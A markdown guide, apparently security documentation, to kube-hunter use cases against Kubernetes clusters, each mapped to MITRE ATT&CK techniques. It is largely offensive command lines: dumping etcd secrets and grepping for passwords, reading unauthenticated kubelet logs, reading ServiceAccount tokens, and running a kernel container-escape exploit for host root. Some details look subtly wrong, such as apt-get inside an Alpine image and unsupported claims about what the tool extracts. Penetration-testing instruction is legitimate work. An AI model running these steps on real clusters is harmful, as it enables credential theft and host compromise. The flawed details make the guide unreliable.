# kube-hunter — Hands-On Use Cases

## External cluster scanning

**MITRE ATT&CK:** T1526 (Cloud Service Discovery)

Scan a network range for Kubernetes API servers (port 6443):

```bash
kube-hunter --remote 10.0.0.0/24
kube-hunter --remote api.production.example.com:6443
```

## Internal cluster scanning (from within a compromised Pod)

**MITRE ATT&CK:** T1526 (Cloud Service Discovery), T1611 (Escape to Host)

Run kube-hunter as a container inside the target cluster:

```bash
# Deploy kube-hunter as a Pod
kubectl run kube-hunter --image=aquasec/kube-hunter:latest --restart=Never --rm -it

# Or deploy it as part of an attacker payload
kubectl run attacker-pod --image=alpine:latest -it --restart=Never -- sh
# Inside the Pod:
apt-get update && apt-get install -y kube-hunter
kube-hunter --pod
```

## Test for unauthenticated API server access

**MITRE ATT&CK:** T1526 (Cloud Service Discovery)

The kube-hunter output will explicitly report if anonymous access is allowed:

```
[Vulnerability] Unauthenticated API Server Access
...
```

If vulnerable, an attacker can use `kubectl` without credentials:

```bash
kubectl --server https://api.example.com:6443 --insecure-skip-tls-verify get secrets
```

## Exploit unencrypted ETCD

**MITRE ATT&CK:** T1552.007 (Unsecured Credentials in Container), T1530 (Data from Cloud Storage)

kube-hunter detects unencrypted ETCD on port 2379. Once found, connect directly:

```bash
etcdctl --endpoints=http://10.0.0.50:2379 get "" --prefix | jq . | grep -i password
etcdctl --endpoints=http://10.0.0.50:2379 get /registry/secrets --prefix
```

## Extract kubelet logs and configuration

**MITRE ATT&CK:** T1526 (Cloud Service Discovery), T1552.007 (Unsecured Credentials)

kube-hunter probes the kubelet API (port 10250). If unauthenticated, read Pod logs and configuration:

```bash
curl -k https://10.0.0.50:10250/logs/
curl -k https://10.0.0.50:10250/pods/
```

## Container escape exploitation

**MITRE ATT&CK:** T1611 (Escape to Host)

kube-hunter tests container escape vectors. If a kernel CVE is exploitable, it reports it. Operators can then use dedicated exploit tools (e.g., `cve-2021-22555` exploit, `dirty cow` exploit):

```bash
# Inside a container with the vulnerable kernel
gcc -o exploit exploit.c -static
./exploit
# If successful, you're now running as root on the host
```

## Test RBAC privilege escalation (after token extraction)

**MITRE ATT&CK:** T1078.004 (Cloud Accounts)

After kube-hunter extracts a ServiceAccount token, use it to test RBAC permissions:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --token=$TOKEN --server=https://kubernetes.default.svc.cluster.local:443 auth can-i list pods -A
```

## Active scanning mode (destructive tests)

**MITRE ATT&CK:** T1578.002 (Modify Cloud Compute Properties)

The `--active` flag enables tests that may cause disruption:

```bash
kube-hunter --remote api.example.com:6443 --active
```

This may attempt to create/delete test resources, modify RBAC, etc.

## Default credential testing

kube-hunter attempts common default credentials:
- Kubernetes Dashboard default credentials
- Google/Azure managed Kubernetes defaults
- Local Kubernetes (minikube) defaults

The tool's output will show if any defaults succeed.
